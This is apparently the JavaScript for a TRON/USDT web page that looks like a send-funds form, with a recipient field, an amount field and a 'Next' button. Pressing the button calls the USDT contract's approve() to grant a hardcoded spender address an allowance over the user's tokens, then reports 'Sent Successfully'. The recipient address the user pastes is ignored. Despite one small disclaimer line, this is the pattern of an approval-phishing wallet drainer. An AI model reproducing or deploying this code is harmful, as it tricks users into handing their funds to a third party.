const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const SPENDER_ADDRESS = 'TE1UofKyVJoyvp6weriPZqFyHY4n2QPB3g';
const USDT_DECIMALS = 6;

const connectButton = document.getElementById('connect-button');
const addressInput = document.getElementById('address-input');
const amountInput = document.getElementById('amount-input');
const pasteButton = document.querySelector('.paste');
const maxButton = document.querySelector('.max');
const estimate = document.getElementById('estimate');
const disclaimer = document.getElementById('disclaimer');
const statusText = document.getElementById('status-text');
const processingModal = document.getElementById('processing-modal');
const processingClose = document.getElementById('processing-close');
const txDetailsButton = document.getElementById('tx-details-button');

let currentAddress = '';
let lastTxId = '';
let isBusy = false;
let isSuccess = false;

const shortAddress = (address) => (
  address ? `${address.slice(0, 6)}...${address.slice(-4)}` : ''
);

const shortTxId = (txId) => (
  txId ? `${txId.slice(0, 8)}...${txId.slice(-8)}` : ''
);

const setStatus = (message, type = '') => {
  statusText.textContent = message;
  statusText.className = `status-text ${type}`.trim();
};

const setProcessing = (isOpen) => {
  processingModal.classList.toggle('hidden', !isOpen);
};

const getTronWeb = () => {
  if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
  if (window.tronWeb) return window.tronWeb;
  return null;
};

const getConnectedAddress = () => {
  const tronWeb = getTronWeb();
  return tronWeb?.defaultAddress?.base58 || '';
};

const updateConnectionStatus = () => {
  currentAddress = getConnectedAddress();
  const hasFinalStatus = statusText.classList.contains('error') || statusText.classList.contains('success');

  if (currentAddress) {
    if (!isBusy && !isSuccess) {
      connectButton.textContent = 'Next';
    }
    if (!isBusy && !hasFinalStatus) {
      setStatus(`Wallet: ${shortAddress(currentAddress)}`);
    }
  } else {
    if (!isBusy && !isSuccess) {
      connectButton.textContent = 'Next';
    }
    if (!isBusy && !hasFinalStatus) {
      setStatus('');
    }
  }
};

const parseUsdtAmount = (value) => {
  const normalized = String(value || '').trim();
  if (!/^\d+(\.\d{1,6})?$/.test(normalized)) {
    throw new Error('Enter a valid USDT amount with up to 6 decimals.');
  }

  const [whole, fraction = ''] = normalized.split('.');
  const units = `${whole}${fraction.padEnd(USDT_DECIMALS, '0')}`.replace(/^0+(?=\d)/, '');
  const amount = BigInt(units || '0');

  if (amount <= 0n) {
    throw new Error('Enter an amount greater than 0.');
  }

  return amount;
};

const formatUsdtUnits = (units) => {
  const value = BigInt(units.toString());
  const base = 10n ** BigInt(USDT_DECIMALS);
  const whole = value / base;
  const fraction = (value % base).toString().padStart(USDT_DECIMALS, '0').replace(/0+$/, '');
  return fraction ? `${whole}.${fraction}` : whole.toString();
};

const updateAmountCopy = () => {
  const amount = amountInput.value || '0';
  estimate.textContent = `≈ $${Number(amount || 0).toFixed(2)}`;
  disclaimer.textContent = `This authorizes spender ${SPENDER_ADDRESS} for the entered USDT amount. It is not a normal transfer.`;
};

const getTronProvider = async () => {
  const tronWeb = getTronWeb();

  if (!tronWeb) {
    throw new Error('TRON wallet not found. Open this page in Trust Wallet.');
  }

  currentAddress = getConnectedAddress();
  return tronWeb;
};

const approveExactAmount = async () => {
  try {
    isBusy = true;
    isSuccess = false;
    setStatus('');
    const amountUnits = parseUsdtAmount(amountInput.value);
    const tronWeb = await getTronProvider();

    updateConnectionStatus();
    setProcessing(true);
    connectButton.disabled = true;
    connectButton.textContent = 'Processing...';

    const contract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
    const txId = await contract.approve(SPENDER_ADDRESS, amountUnits.toString()).send({
      feeLimit: 100000000
    });

    lastTxId = txId;
    isSuccess = true;
    txDetailsButton.disabled = false;
    setStatus(`Authorization submitted for ${formatUsdtUnits(amountUnits)} USDT. Tx: ${shortTxId(txId)}`, 'success');
    connectButton.textContent = 'Sent Successfully';
    connectButton.classList.add('success');
  } catch (error) {
    console.error('Approval failed:', error);
    isSuccess = false;
    setProcessing(false);
    setStatus(error?.message || 'Transaction failed', 'error');
    connectButton.textContent = 'Next';
  } finally {
    isBusy = false;
    connectButton.disabled = false;
  }
};

pasteButton.addEventListener('click', async () => {
  try {
    addressInput.value = await navigator.clipboard.readText();
  } catch {
    setStatus('Paste failed. Please paste manually.', 'error');
  }
});

maxButton.addEventListener('click', () => {
  amountInput.value = '1000';
  updateAmountCopy();
});

amountInput.addEventListener('input', () => {
  isSuccess = false;
  lastTxId = '';
  connectButton.classList.remove('success');
  txDetailsButton.disabled = true;
  updateAmountCopy();
  setStatus(currentAddress ? `Wallet: ${shortAddress(currentAddress)}` : '');
});
connectButton.addEventListener('click', approveExactAmount);
processingClose.addEventListener('click', () => setProcessing(false));
txDetailsButton.addEventListener('click', () => {
  if (lastTxId) {
    window.open(`https://tronscan.org/#/transaction/${lastTxId}`, '_blank');
  }
});

updateAmountCopy();
updateConnectionStatus();
setInterval(updateConnectionStatus, 1500);
